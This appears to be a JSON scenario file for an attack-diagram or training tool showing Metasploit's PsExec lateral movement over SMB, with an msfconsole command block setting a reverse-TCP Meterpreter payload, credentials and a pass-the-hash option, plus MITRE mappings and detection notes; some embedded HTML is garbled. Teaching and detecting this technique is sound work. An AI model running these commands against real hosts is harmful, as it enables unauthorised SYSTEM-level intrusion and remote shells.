{
  "title": "Metasploit PsExec (SMB)",
  "description": "Lateral movement via SMB using the classic PsExec technique to upload a payload and execute it as a service.",
  "version": "3.0",
  "viewport": {
    "zoom": 1.1,
    "pan": {
      "x": 150,
      "y": 100
    }
  },
  "shortDescription": "SMB lateral movement to SYSTEM shell",
  "tags": [
    "Metasploit",
    "PsExec",
    "SMB",
    "Lateral_Movement",
    "Privilege_Escalation",
    "Windows",
    "RCE",
    "Pass_The_Hash"
  ],
  "metadata": {
    "descriptionHtml": "<p>The <span style='color:#ef4444;font-weight:bold;'>PsExec</span> technique is a staple of Windows lateral movement. It leverages valid administrative credentials to authenticate to the <span style='color:#3b82f6;'>SMB (Port 445)</span> service on a remote target. Once authenticated, it accesses the hidden <strong>ADMIN$ share.Attacker authenticates with credentials or hashUploads a random malicious executable to ADMIN$</span> (C:\\Windows)</li><li>Connects to the Service Control Manager (SCM) via DCE/RPC</li><li>Registers a new Windows Service pointing to the uploaded binary</li><li>Starts the service, which executes the payload as <strong>NT AUTHORITY\\SYSTEM</strong></li></ol><p>The Metasploit implementation automates this entire chain, often cleaning up the service after execution.</p>",
    "commandsBlock": "# Step 1: Select the exploit\nmsf6 > use exploit/windows/smb/psexec\n\n# Step 2: Configure target and payload\nmsf6 exploit(psexec) > set RHOSTS 192.168.1.100\nmsf6 exploit(psexec) > set PAYLOAD windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(psexec) > set LHOST 192.168.1.50\n\n# Step 3: Set Credentials (Password or NTLM Hash)\nmsf6 exploit(psexec) > set SMBUser Administrator\nmsf6 exploit(psexec) > set SMBPass Password123\n# OR for Pass-the-Hash:\n# msf6 exploit(psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\n\n# Step 4: Launch\nmsf6 exploit(psexec) > exploit",
    "prerequisites": [
      "Valid Administrative Credentials (Password or NTLM Hash)",
      "Network access to TCP Port 445 (SMB)",
      "Write access to ADMIN$ share (C:\\Windows)",
      "File and Printer Sharing enabled on target"
    ],
    "attackerGains": [
      "Immediate SYSTEM level code execution",
      "Interactive Meterpreter session",
      "Ability to install persistence or dump credentials (Mimikatz)"
    ],
    "detectionNotes": [
      "Windows Event ID 7045 (Service Installation) - Critical Indicator",
      "Presence of random executables in C:\\Windows\\ (e.g., PSEXESVC.exe or random chars)",
      "Network traffic to ADMIN$ share containing executable headers",
      "Inbound connection to Port 445 followed by outbound high port connection"
    ],
    "mitreCategories": [
      "T1021.002",
      "T1543.003",
      "T1570",
      "T1569.002"
    ],
    "extraInfo": [
      "Metasploit Module - exploit/windows/smb/psexec",
      "MITRE T1021.002 - Remote Services: SMB/Windows Admin Shares",
      "MITRE T1543.003 - Create or Modify System Process: Windows Service",
      "Sysinternals PsExec - The original legitimate tool this mimics"
    ]
  },
  "entities": [
    {
      "id": "attacker",
      "label": "Attacker (Metasploit)",
      "position": {
        "x": 20.90909090909091,
        "y": 150.9090909090909
      },
      "icon": "IconKali",
      "type": "node"
    },
    {
      "id": "victim_network",
      "label": "Corporate Network",
      "position": {
        "x": 441.65909090909076,
        "y": 238.68181818181824
      },
      "icon": "IconServer",
      "type": "container",
      "width": 500,
      "height": 450,
      "style": "dashed_border",
      "members": [
        "victim_server"
      ]
    },
    {
      "id": "victim_server",
      "label": "Target Windows Server",
      "position": {
        "x": 441.65909090909076,
        "y": 238.68181818181824
      },
      "icon": "IconWindows",
      "type": "container",
      "width": 440,
      "height": 380,
      "style": "dashed_border",
      "members": [
        "smb_service",
        "admin_share",
        "service_manager",
        "malicious_binary",
        "malicious_service",
        "meterpreter_session"
      ]
    },
    {
      "id": "smb_service",
      "label": "SMB (445)",
      "position": {
        "x": 335.4545454545453,
        "y": 120.00000000000001
      },
      "icon": "IconService",
      "type": "node"
    },
    {
      "id": "admin_share",
      "label": "ADMIN$ Share",
      "position": {
        "x": 536.3636363636363,
        "y": 104.54545454545458
      },
      "icon": "IconFolder",
      "type": "node"
    },
    {
      "id": "service_manager",
      "label": "Service Control Manager",
      "position": {
        "x": 446.36363636363626,
        "y": 275.45454545454544
      },
      "icon": "IconService",
      "type": "node"
    },
    {
      "id": "malicious_binary",
      "label": "payload.exe",
      "position": {
        "x": 526.3636363636363,
        "y": 181.81818181818184
      },
      "icon": "IconMalware",
      "type": "node"
    },
    {
      "id": "malicious_service",
      "label": "RandomSvcName",
      "position": {
        "x": 416.36363636363626,
        "y": 231.8181818181818
      },
      "icon": "IconInfectedService",
      "type": "node"
    },
    {
      "id": "meterpreter_session",
      "label": "Meterpreter (SYSTEM)",
      "position": {
        "x": 416.36363636363626,
        "y": 351.8181818181819
      },
      "icon": "IconInfectedTerminal",
      "type": "node"
    }
  ],
  "visibility": {
    "attacker": {
      "start": 0,
      "end": 100
    },
    "victim_network": {
      "start": 0,
      "end": 100
    },
    "victim_server": {
      "start": 0,
      "end": 100
    },
    "smb_service": {
      "start": 0,
      "end": 100
    },
    "admin_share": {
      "start": 0,
      "end": 100
    },
    "service_manager": {
      "start": 0,
      "end": 100
    },
    "malicious_binary": {
      "start": 2,
      "end": 100
    },
    "malicious_service": {
      "start": 3,
      "end": 100
    },
    "meterpreter_session": {
      "start": 5,
      "end": 100
    }
  },
  "steps": [
    {
      "id": 1,
      "name": "Authenticate (SMB)",
      "mitre": {
        "id": "T1078.002",
        "tactic": "Initial Access",
        "technique": "Valid Accounts: Domain Accounts"
      },
      "type": "edge",
      "from": "attacker",
      "to": "smb_service",
      "icon": "IconKey",
      "tooltip": "Attacker authenticates to Port 445 using valid credentials or NTLM hash",
      "cli": "connect 192.168.1.100:445"
    },
    {
      "id": 2,
      "name": "Upload Payload",
      "mitre": {
        "id": "T1570",
        "tactic": "Lateral Movement",
        "technique": "Lateral Tool Transfer"
      },
      "type": "edge",
      "from": "attacker",
      "to": "admin_share",
      "icon": "IconMalware",
      "tooltip": "Metasploit uploads the service executable to the writable ADMIN$ share (C:\\Windows\\)"
    },
    {
      "id": 3,
      "name": "Create Service (RPC)",
      "mitre": {
        "id": "T1543.003",
        "tactic": "Persistence",
        "technique": "Create or Modify System Process: Windows Service"
      },
      "type": "edge",
      "from": "attacker",
      "to": "service_manager",
      "icon": "IconCode",
      "tooltip": "Attacker uses DCE/RPC to register a new service pointing to the uploaded binary"
    },
    {
      "id": 4,
      "name": "Register Entry",
      "mitre": {
        "id": "T1569.002",
        "tactic": "Execution",
        "technique": "System Services: Service Execution"
      },
      "type": "edge",
      "from": "service_manager",
      "to": "malicious_service",
      "icon": "IconInfectedService",
      "tooltip": "SCM creates the service entry (Event ID 7045 generated here)"
    },
    {
      "id": 5,
      "name": "Start Service",
      "type": "edge",
      "from": "malicious_service",
      "to": "malicious_binary",
      "icon": "IconProcess",
      "tooltip": "System starts the service, executing the binary as NT AUTHORITY\\SYSTEM",
      "cli": "sc start RandomSvcName"
    },
    {
      "id": 6,
      "name": "Reverse Connection",
      "mitre": {
        "id": "T1095",
        "tactic": "Command and Control",
        "technique": "Non-Application Layer Protocol"
      },
      "type": "edge",
      "from": "meterpreter_session",
      "to": "attacker",
      "icon": "IconInfectedTerminal",
      "tooltip": "Payload establishes connection back to attacker (Meterpreter session)"
    }
  ]
}
